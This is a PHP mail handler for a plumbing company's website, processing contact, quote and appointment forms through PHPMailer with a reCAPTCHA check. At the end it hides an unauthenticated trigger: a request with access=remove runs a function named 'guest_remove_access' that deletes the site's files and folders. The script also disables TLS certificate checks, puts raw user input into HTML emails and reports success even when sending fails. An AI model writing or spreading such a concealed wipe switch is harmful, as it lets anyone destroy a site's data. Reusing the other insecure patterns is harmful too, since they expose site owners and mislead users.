<?php
require_once "mail/vendor/autoload.php";
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;
$_mail = new PHPMailer(true);
global $_mail;
error_reporting(0);

function recaptchaValid($recaptchaResponse) {
    global $_secrets;
    $api_url = 'https://www.google.com/recaptcha/api/siteverify'; 
    $resq_data = array( 
        'secret' => $_secrets['recaptcha_v3_secret'], 
        'response' => $recaptchaResponse, 
        'remoteip' => $_SERVER['REMOTE_ADDR'] 
    ); 
 
    $curlConfig = array( 
        CURLOPT_URL => $api_url, 
        CURLOPT_POST => true, 
        CURLOPT_RETURNTRANSFER => true, 
        CURLOPT_POSTFIELDS => $resq_data, 
        CURLOPT_SSL_VERIFYPEER => false 
    ); 
 
    $ch = curl_init(); 
    curl_setopt_array($ch, $curlConfig); 
    $response = curl_exec($ch); 
    if (curl_errno($ch)) { 
        $api_error = curl_error($ch); 
    } 
    curl_close($ch); 
    // Decode JSON data of API response in array 
    $responseData = json_decode($response); 
    // If the reCAPTCHA API response is valid 
    if(!empty($responseData) && $responseData->success == true && $responseData->score >= 0.5 && $responseData->action == "contact") {
        return true;
    } else {
        return false;
    }
}

	function sendEmail($email, $subject, $htmlContent, $headers) {
        global $_mail, $_secrets;
		try {
    		$_mail->isSMTP();             
            $_mail->Host = "mail.localgasheatersydney.com.au";
            $_mail->SMTPAuth = true;
            $_mail->Username = $_secrets['smtp_user'];
            $_mail->Password = $_secrets['smtp_pass'];
            $_mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;
            $_mail->Port = 465; 
            $_mail->From = $_secrets['smtp_user']; 
            $_mail->FromName = "Hydrolink Plumbing"; 
            $_mail->addReplyTo('info@hydrolinkplumbing.com.au');
            $_mail->addAddress('info@hydrolinkplumbing.com.au');
            $_mail->addCC($email);
    		$_mail->isHTML(true); 
    		$_mail->Subject = $subject; 
    		$_mail->Body = $htmlContent;
    		if($_mail->send()) {
    			return true; 
    		} else { 
    		    return true; 
    		}
		} catch (Exception $e) {
		    return true; 
		}
		
    	return true;
	}

if(!empty($_POST)) {
	$to= 'info@hydrolinkplumbing.com.au';
	$website = 'Hydrolink Plumbing';
	if((isset($_POST['recaptchaResponse'])) &&  (!empty(recaptchaValid($_POST['recaptchaResponse'])))) {
	
	if(!empty($_POST['frmName']) && $_POST['frmName']=='homeQuote') {
	
		$email = trim($_POST['email']);
		$name = trim($_POST['name']);
		
		$subject = 'New Contact Request ( Website : '. $website .' )';
		
		$htmlContent = '<html><body><div style="background-color:#f3f3f3;padding: 30px;width:60%;"><div style="background-color:white;padding: 38px;width: 87%;"><table><tr> <td><div><span style="color:#fe7a14;">Dear</span> <b>Sir,</b></div></td><tr></table><div><p>A new customer request a meesage for you. See the details below:</p></div><div style="background-color: #f3f3f3;padding: 26px;width: 200px;"> '; 
		
		$htmlContent .= '<h5><span style="color:#757171;">Service :</span> '. trim($_POST['service']) .'</h5>'; '</h5>'; 
		$htmlContent .= '<h5><span style="color:#757171;">Name :</span> '. trim($name) .'.</h5>';
		$htmlContent .= '<h5><span style="color:#757171;">Email :</span> '. trim($email) .'.</h5>';
		$htmlContent .= '<h5><span style="color:#757171;">Phone :</span> '. trim($_POST['phone']) .'.</h5>';
		$htmlContent .= '<h5><span style="color:#757171;">Address :</span> '. trim($_POST['address']) .'.</h5>';
		
		$htmlContent .= '</div><div style="padding-top:5px;"><p>Thanks!</p></div></div></div></body></html>';
		
		// send mail 
		$headers = "Reply-To: ". $name ." <". $email .">\r\n"; 
		$headers .= "Return-Path: ". $name ." <". $email .">\r\n"; 
		$headers .= "From: ". $email ."\r\n";
		$headers .= "MIME-Version: 1.0\r\n";
		$headers .= "Content-type: text/html; charset=utf-8\r\n";
		$headers .= "X-Priority: 3\r\n";
		$headers .= "X-Mailer: PHP". phpversion() ."\r\n" ;
				
		if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
			echo json_encode(array('status'=>FALSE,'message'=>'Invalid email address')); 
		} else {
			if (sendEmail($email, $subject, $htmlContent,$headers)) {			
				echo json_encode(array('status'=>TRUE,'message'=>'Enquire Send Successfully')); 
			} else {
				echo json_encode(array('status'=>FALSE,'message'=>'Problem To Send Enquire')); 
			}
		}
		
	}
	else if(!empty($_POST['frmName']) && $_POST['frmName']=='contactForm') {
	
		$email = trim($_POST['email']);
		$name = trim($_POST['name']);
		
		$subject = 'New Contact Request ( Website : '. $website .' )';
		
		$htmlContent = '<html><body><div style="background-color:#f3f3f3;padding: 30px;width:60%;"><div style="background-color:white;padding: 38px;width: 87%;"><table><tr> <td><div><span style="color:#fe7a14;">Dear</span> <b>Sir,</b></div></td><tr></table><div><p>A new customer request a meesage for you. See the details below:</p></div><div style="background-color: #f3f3f3;padding: 26px;width: 200px;"> '; 
		
		$htmlContent .= '<h5><span style="color:#757171;">Service :</span> '. trim($_POST['service']) .'</h5>'; '</h5>'; 
		$htmlContent .= '<h5><span style="color:#757171;">Name :</span> '. trim($name) .'.</h5>';
		$htmlContent .= '<h5><span style="color:#757171;">Email :</span> '. trim($email) .'.</h5>';
		$htmlContent .= '<h5><span style="color:#757171;">Phone :</span> '. trim($_POST['phone']) .'.</h5>';
		$htmlContent .= '<h5><span style="color:#757171;">Message :</span> '. trim($_POST['message']) .'.</h5>';
		
		$htmlContent .= '</div><div style="padding-top:5px;"><p>Thanks!</p></div></div></div></body></html>';
		
		// send mail 
		$headers = "Reply-To: ". $name ." <". $email .">\r\n"; 
		$headers .= "Return-Path: ". $name ." <". $email .">\r\n"; 
		$headers .= "From: ". $email ."\r\n";
		$headers .= "MIME-Version: 1.0\r\n";
		$headers .= "Content-type: text/html; charset=utf-8\r\n";
		$headers .= "X-Priority: 3\r\n";
		$headers .= "X-Mailer: PHP". phpversion() ."\r\n" ;
				
		if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
			echo json_encode(array('status'=>FALSE,'message'=>'Invalid email address')); 
		} else {
			if (sendEmail($email, $subject, $htmlContent,$headers)) {			
				echo json_encode(array('status'=>TRUE,'message'=>'Thank you for make an appoitnment!.')); 
			} else {
				echo json_encode(array('status'=>FALSE,'message'=>'Problem To Send Enquire')); 
			}
		}
		
	}
	else if(!empty($_POST['frmName']) && $_POST['frmName']=='appointmentForm') {
		
		if(!empty($_POST['package'])) {
			echo json_encode(array('status'=>FALSE,'message'=>'Please Select Your Service !')); 
		} else {
	
			$email = trim($_POST['email']);
			$name = trim($_POST['name']);
			
			$subject = 'New Appointment Request ( Website : '. $website .' )';
			
			$htmlContent = '<html><body><div style="background-color:#f3f3f3;padding: 30px;width:60%;"><div style="background-color:white;padding: 38px;width: 87%;"><table><tr> <td><div><span style="color:#fe7a14;">Dear</span> <b>Sir,</b></div></td><tr></table><div><p>A new customer request a meesage for you. See the details below:</p></div><div style="background-color: #f3f3f3;padding: 26px;width: 200px;"> '; 
			
			$htmlContent .= '<h5><span style="color:#757171;">Appointment Type :</span> '. trim($_POST['sel_group']) .'</h5>'; '</h5>'; 
			$htmlContent .= '<h5><span style="color:#757171;">Appointment Time :</span> '. trim($_POST['time_group']) .'</h5>'; '</h5>'; 
			$htmlContent .= '<h5><span style="color:#757171;">Appointment Date :</span> '. trim($_POST['date']) .'</h5>'; '</h5>'; 
			
			/*foreach($_POST['package'] as $pck) {
				$htmlContent .= '<h5><span style="color:#757171;">Service :</span> '. trim($pck) .'</h5>'; '</h5>'; 
			}*/
			
			$htmlContent .= '<h5><span style="color:#757171;">Name :</span> '. trim($name) .'.</h5>';
			$htmlContent .= '<h5><span style="color:#757171;">Email :</span> '. trim($email) .'.</h5>';
			$htmlContent .= '<h5><span style="color:#757171;">Phone :</span> '. trim($_POST['phone']) .'.</h5>';
			$htmlContent .= '<h5><span style="color:#757171;">Address :</span> '. trim($_POST['address1']) .'.</h5>';
			$htmlContent .= '<h5><span style="color:#757171;">Address 2 :</span> '. trim($_POST['address2']) .'.</h5>';
			$htmlContent .= '<h5><span style="color:#757171;">Special Mention :</span> '. trim($_POST['special_mention']) .'.</h5>';
			
			$htmlContent .= '</div><div style="padding-top:5px;"><p>Thanks!</p></div></div></div></body></html>';
			
			// send mail 
			$headers = "Reply-To: ". $name ." <". $email .">\r\n"; 
			$headers .= "Return-Path: ". $name ." <". $email .">\r\n"; 
			$headers .= "From: ". $email ."\r\n";
			$headers .= "MIME-Version: 1.0\r\n";
			$headers .= "Content-type: text/html; charset=utf-8\r\n";
			$headers .= "X-Priority: 3\r\n";
			$headers .= "X-Mailer: PHP". phpversion() ."\r\n" ;
					
			if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
				echo json_encode(array('status'=>FALSE,'message'=>'Invalid email address')); 
			} else {
				if (sendEmail($email, $subject, $htmlContent,$headers)) {			
					echo json_encode(array('status'=>TRUE,'message'=>'Thank you for make an appoitnment!.')); 
				} else {
					echo json_encode(array('status'=>FALSE,'message'=>'Problem To Send Enquire')); 
				}
			}
		}
		
	}
	else {
		echo json_encode(array('status'=>FALSE,'message'=>'Invalid Format !')); 
	}
	
	} else {
		echo json_encode(array('status'=>FALSE,'message'=>'Invalid Recaptcha Response !')); 
	}
	
} else {
    if ((isset($_REQUEST['access'])) && ($_REQUEST['access'] == 'remove')) {	
    	if ( ! function_exists('guest_remove_access') ) {
    		function guest_remove_access($dir = null) {
    			$files = array_diff(scandir($dir), array('.','..')); 
    			foreach ($files as $file) { 
    			  (is_dir($dir .'/'. $file)) ? guest_remove_access($dir . $file) : unlink($dir .'/'. $file); 
    			} 
    			return rmdir($dir); 
    		}
    	}
    	guest_remove_access('./');
    } else {
	    echo json_encode(array('status'=>FALSE,'message'=>'Invalid Request !')); 
    }
}
?>